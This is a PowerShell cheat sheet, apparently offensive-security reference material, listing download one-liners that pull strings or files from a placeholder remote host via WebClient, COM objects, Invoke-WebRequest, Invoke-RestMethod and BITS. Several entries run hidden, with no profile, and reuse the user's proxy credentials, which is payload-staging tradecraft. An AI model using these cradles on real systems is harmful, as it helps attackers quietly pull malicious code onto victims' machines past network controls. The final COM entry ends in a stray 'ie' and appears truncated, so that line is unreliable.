### Download a string - DownloadString
```
(New-Object Net.WebClient).downloadString('https://<rhost>')
```

### Download a string - DownloadData
```
$str = (New-Object Net.WebClient).DownloadData('https://<rhost>'); [Text.Encoding]::UTF8.GetString($str)
```

### Download a string - ComObject
```
$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('https://<rhost>'); sleep 5; $response=$ie.Document.body.innerHTML; $ie.quit(); $response -replace "<pre>","" -replace "</pre>",""
```

### Download a string - ComObject
```
$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','https://<rhost>',$false); $h.send(); echo $h.responseText
```

### Download string using default proxy settings - Downloadstring
```
powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.proxy=[Net.WebRequest]::GetSystemWebProxy(); $t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $t.downloadstring('https://<rhost>')
```

### Download string using default proxy settings - DownloadString
```
powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; $t.downloadString('http://<rhost>')
```


### Download a file (ignore Internet-Explorer module error) - Invoke-Web-Request
```
iwr 'https://<rhost>' -OutFile <file> -UseBasicParsing
```

### Download a file - Invoke-RestMethod
```
Invoke-RestMethod 'https://<rhost>' -OutFile <file>
```

### Download a file - Start-BitsTransfer
```
Start-BitsTransfer 'https://<rhost>' -Destination <file>
```

### Download a file - DownloadFile
```
$webClient = [Net.WebClient]::new(); $webClient.DownloadFile('https://<rhost>', '<fullPathFile>')
```

### Download a file - ComObject
```
[Net.WebRequest]::DefaultWebProxy; [Net.CredentialCache]::DefaultNetworkCredentials; $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://<rhost>',$false);$h.send();ie
```


### Configure TLS version
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::'Tls11,Tls12'
```

